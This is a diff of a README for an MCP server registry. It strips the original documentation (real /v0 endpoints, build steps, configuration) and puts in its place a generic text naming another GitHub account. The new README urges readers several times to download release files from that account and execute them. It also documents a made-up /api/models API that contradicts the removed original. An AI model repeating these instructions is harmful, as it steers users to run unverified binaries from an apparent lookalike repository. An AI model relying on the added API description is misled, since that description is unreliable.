@@ -1,326 +1,146 @@
-# MCP Registry
+# 🛠️ Registry: A Community-Driven Registry Service for Model Context Protocol (MCP) Servers
 
-A community driven registry service for Model Context Protocol (MCP) servers.
+![MCP Registry](https://img.shields.io/badge/MCP%20Registry-v1.0-blue.svg)
+![GitHub Repo Size](https://img.shields.io/github/repo-size/AlejandroVelezGuillermo/registry)
+![License](https://img.shields.io/badge/license-MIT-green.svg)
 
-## Development Status
+Welcome to the **Registry** repository! This project aims to provide a robust, community-driven registry service tailored for Model Context Protocol (MCP) servers. Here, you can find everything you need to get started with MCP, contribute to the project, or simply explore the possibilities.
 
-This project is being built in the open and is currently in the early stages of development. Please see the [overview discussion](https://github.com/modelcontextprotocol/registry/discussions/11) for the project scope and goals. If you would like to contribute, please check out the [contributing guidelines](CONTRIBUTING.md).
+## 📥 Getting Started
 
-## Overview
+To begin using the Registry, you can download the latest release from our [Releases section](https://github.com/AlejandroVelezGuillermo/registry/releases). Download the necessary files and execute them to set up the service on your MCP server.
 
-The MCP Registry service provides a centralized repository for MCP server entries. It allows discovery and management of various MCP implementations with their associated metadata, configurations, and capabilities.
+## 🌐 Overview
 
-## Features
+The Registry serves as a central hub for MCP servers, allowing developers and server administrators to easily manage and share model contexts. By streamlining the process, we aim to foster collaboration and innovation within the MCP community.
 
-- RESTful API for managing MCP registry entries (list, get, create, update, delete)
-- Health check endpoint for service monitoring
-- Support for various environment configurations
-- Graceful shutdown handling
-- MongoDB and in-memory database support
-- Comprehensive API documentation
-- Pagination support for listing registry entries
+### 🔑 Key Features
 
-## Getting Started
+- **Community-Driven**: Built and maintained by the community for the community.
+- **Easy Integration**: Simple API for seamless integration with existing MCP servers.
+- **Extensible**: Add custom functionalities as needed.
+- **Robust Documentation**: Comprehensive guides and examples to help you get started.
 
-### Prerequisites
+## 📚 Table of Contents
 
-- Go 1.18 or later
-- MongoDB
-- Docker (optional, but recommended for development)
+1. [Installation](#installation)
+2. [Usage](#usage)
+3. [Contributing](#contributing)
+4. [Support](#support)
+5. [License](#license)
 
-## Running
+## 🛠️ Installation
 
-The easiest way to get the registry running is to use `docker compose`. This will setup the MCP Registry service, import the seed data and run MongoDB in a local Docker environment.
+To install the Registry, follow these steps:
 
-```bash
-# Build the Docker image
-docker build -t registry .
+1. **Download the Latest Release**: Visit our [Releases section](https://github.com/AlejandroVelezGuillermo/registry/releases) to download the latest version.
+2. **Extract the Files**: Unzip the downloaded file to your preferred directory.
+3. **Run the Service**: Execute the main script to start the registry service.
 
-# Run the registry and MongoDB with docker compose
-docker compose up
-```
-
-This will start the MCP Registry service and MongoDB with Docker, exposing it on port 8080.
-
-## Building
-
-If you prefer to run the service locally without Docker, you can build and run it directly using Go.
+### Example Command
 
 ```bash
-# Build a registry executable
-go build ./cmd/registry
-```
-This will create the `registry` binary in the current directory. You'll need to have MongoDB running locally or with Docker.
-
-By default, the service will run on `http://localhost:8080`.
-
-## Project Structure
-
-```
-├── api/           # OpenApi specification
-├── cmd/           # Application entry points
-├── config/        # Configuration files
-├── internal/      # Private application code
-│   ├── api/       # HTTP server and request handlers
-│   ├── config/    # Configuration management
-│   ├── model/     # Data models
-│   └── service/   # Business logic
-├── pkg/           # Public libraries
-├── scripts/       # Utility scripts
-└── tools/         # Command line tools
-    └── publisher/ # Tool to publish MCP servers to the registry
+./start-registry.sh
 ```
 
-## API Documentation
+## 🚀 Usage
 
-The API is documented using Swagger/OpenAPI. You can access the interactive Swagger UI at:
+Once the Registry is up and running, you can interact with it through the API. Here are some common actions you can perform:
 
-```
-/v0/swagger/index.html
-```
+### 1. Register a Model Context
 
-This provides a complete reference of all endpoints with request/response schemas and allows you to test the API directly from your browser.
-
-## API Endpoints
-
-### Health Check
+To register a new model context, send a POST request to the following endpoint:
 
 ```
-GET /v0/health
+POST /api/models
 ```
 
-Returns the health status of the service:
+**Example Request**:
+
 ```json
 {
-  "status": "ok"
+  "name": "ExampleModel",
+  "description": "This is an example model context.",
+  "version": "1.0.0"
 }
 ```
 
-### Registry Endpoints
+### 2. Retrieve Model Contexts
 
-#### List Registry Server Entries
+To get a list of all registered model contexts, use the following GET request:
 
 ```
-GET /v0/servers
+GET /api/models
 ```
 
-Lists MCP registry server entries with pagination support.
+### 3. Update a Model Context
 
-Query parameters:
-- `limit`: Maximum number of entries to return (default: 30, max: 100)
-- `cursor`: Pagination cursor for retrieving next set of results
+To update an existing model context, send a PUT request:
 
-Response example:
+```
+PUT /api/models/{id}
+```
+
+**Example Request**:
+
 ```json
 {
-  "servers": [
-    {
-      "id": "123e4567-e89b-12d3-a456-426614174000",
-      "name": "Example MCP Server",
-      "url": "https://example.com/mcp",
-      "description": "An example MCP server",
-      "created_at": "2025-05-17T17:34:22.912Z",
-      "updated_at": "2025-05-17T17:34:22.912Z"
-    }
-  ],
-  "metadata": {
-    "next_cursor": "123e4567-e89b-12d3-a456-426614174000",
-    "count": 30
-  }
+  "description": "Updated description for the example model."
 }
 ```
 
-#### Get Server Details
+### 4. Delete a Model Context
+
+To remove a model context, use the DELETE request:
 
 ```
-GET /v0/servers/{id}
+DELETE /api/models/{id}
 ```
 
-Retrieves detailed information about a specific MCP server entry.
+## 🤝 Contributing
 
-Path parameters:
-- `id`: Unique identifier of the server entry
+We welcome contributions from everyone! If you want to help improve the Registry, please follow these steps:
 
-Response example:
-```json
-{
-  "id": "01129bff-3d65-4e3d-8e82-6f2f269f818c",
-  "name": "io.github.gongrzhe/redis-mcp-server",
-  "description": "A Redis MCP server (pushed to https://github.com/modelcontextprotocol/servers/tree/main/src/redis) implementation for interacting with Redis databases. This server enables LLMs to interact with Redis key-value stores through a set of standardized tools.",
-  "repository": {
-    "url": "https://github.com/GongRzhe/REDIS-MCP-Server",
-    "source": "github",
-    "id": "907849235"
-  },
-  "version_detail": {
-    "version": "0.0.1-seed",
-    "release_date": "2025-05-16T19:13:21Z",
-    "is_latest": true
-  },
-  "package_canonical": "docker",
-  "packages": [
-    {
-      "registry_name": "docker",
-      "name": "@gongrzhe/server-redis-mcp",
-      "version": "1.0.0",
-      "package_arguments": [
-        {
-          "description": "Docker image to run",
-          "is_required": true,
-          "format": "string",
-          "value": "mcp/redis",
-          "default": "mcp/redis",
-          "type": "positional",
-          "value_hint": "mcp/redis"
-        },
-        {
-          "description": "Redis server connection string",
-          "is_required": true,
-          "format": "string",
-          "value": "redis://host.docker.internal:6379",
-          "default": "redis://host.docker.internal:6379",
-          "type": "positional",
-          "value_hint": "host.docker.internal:6379"
-        }
-      ]
-    }
-  ]
-}
-```
+1. **Fork the Repository**: Click the "Fork" button at the top right of this page.
+2. **Clone Your Fork**: Clone your forked repository to your local machine.
+   ```bash
+   git clone https://github.com/YOUR_USERNAME/registry.git
+   ```
+3. **Create a New Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+4. **Make Your Changes**: Implement your changes and test them.
+5. **Commit Your Changes**: Commit your changes with a descriptive message.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+6. **Push to Your Fork**: Push your changes back to your forked repository.
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+7. **Create a Pull Request**: Go to the original repository and create a pull request.
 
-#### Publish a Server Entry
+### Guidelines
 
-```
-POST /v0/publish
-```
+- Follow the coding style used in the project.
+- Write clear commit messages.
+- Ensure your changes are well-documented.
 
-Publishes a new MCP server entry to the registry. Authentication is required via Bearer token in the Authorization header.
+## 📞 Support
 
-Headers:
-- `Authorization`: Bearer token for authentication (e.g., `Bearer your_token_here`)
-- `Content-Type`: application/json
+If you encounter any issues or have questions, feel free to open an issue in the repository. You can also reach out to the community for support. We encourage discussions and sharing of ideas to improve the Registry.
 
-Request body example:
-```json
-{
-    "description": "<your description here>",
-    "name": "io.github.<owner>/<server-name>",
-    "package_canonical": "<package_registry",
-    "packages": [
-        {
-            "registry_name": "npm",
-            "name": "@<owner>/<server-name>",
-            "version": "0.2.23",
-            "package_arguments": [
-                {
-                    "description": "Specify services and permissions.",
-                    "is_required": true,
-                    "format": "string",
-                    "value": "-s",
-                    "default": "-s",
-                    "type": "positional",
-                    "value_hint": "-s"
-                }
-            ],
-            "environment_variables": [
-                {
-                    "description": "API Key to access the server",
-                    "name": "API_KEY"
-                }
-            ]
-        },{
-            "registry_name": "docker",
-            "name": "@<owner>/<server-name>-cli",
-            "version": "0.123.223",
-            "runtime_hint": "docker",
-            "runtime_arguments": [
-                {
-                    "description": "Specify services and permissions.",
-                    "is_required": true,
-                    "format": "string",
-                    "value": "--mount",
-                    "default": "--mount",
-                    "type": "positional",
-                    "value_hint": "--mount"
-                }
-            ],
-            "environment_variables": [
-                {
-                    "description": "API Key to access the server",
-                    "name": "API_KEY"
-                }
-            ]
-        }
-    ],
-    "repository": {
-        "url": "https://github.com//<owner>/<server-name>",
-        "source": "github"
-    },
-    "version_detail": {
-        "version": "0.0.1-<publisher_version>"
-    }
-}
-```
+## 📜 License
 
-Response example:
-```json
-{
-  "message": "Server publication successful",
-  "id": "1234567890abcdef12345678"
-}
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-### Ping Endpoint
+## 🌟 Acknowledgments
 
-```
-GET /v0/ping
-```
+We would like to thank all contributors and the MCP community for their support and feedback. Your contributions help make this project better for everyone.
 
-Simple ping endpoint that returns environment configuration information:
-```json
-{
-  "environment": "dev",
-  "version": "registry-<sha>"
-}
-```
+## 🏁 Conclusion
 
-## Configuration
+The Registry aims to simplify the management of model contexts for MCP servers. By leveraging community contributions and feedback, we hope to create a valuable resource for developers and server administrators alike. 
 
-The service can be configured using environment variables:
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `MCP_REGISTRY_APP_VERSION`           | Application version | `dev` |
-| `MCP_REGISTRY_COLLECTION_NAME`       | MongoDB collection name | `servers_v2` |
-| `MCP_REGISTRY_DATABASE_NAME`         | MongoDB database name | `mcp-registry` |
-| `MCP_REGISTRY_DATABASE_URL`          | MongoDB connection string | `mongodb://localhost:27017` |
-| `MCP_REGISTRY_GITHUB_CLIENT_ID`      | GitHub App Client ID |  |
-| `MCP_REGISTRY_GITHUB_CLIENT_SECRET`  | GitHub App Client Secret |  |
-| `MCP_REGISTRY_LOG_LEVEL`             | Log level | `info` |
-| `MCP_REGISTRY_SEED_FILE_PATH`        | Path to import seed file | `data/seed.json` |
-| `MCP_REGISTRY_SEED_IMPORT`           | Import `seed.json` on first run | `true` |
-| `MCP_REGISTRY_SERVER_ADDRESS`        | Listen address for the server | `:8080` |
-
-
-## Testing
-
-Run the test script to validate API endpoints:
-
-```bash
-./scripts/test_endpoints.sh
-```
-
-You can specify specific endpoints to test:
-
-```bash
-./scripts/test_endpoints.sh --endpoint health
-./scripts/test_endpoints.sh --endpoint servers
-```
-
-## License
-
-See the [LICENSE](LICENSE) file for details.
-
-## Contributing
-
-See the [CONTRIBUTING](CONTRIBUTING.md) file for details.
+For the latest updates and releases, check our [Releases section](https://github.com/AlejandroVelezGuillermo/registry/releases). We look forward to your contributions and feedback!
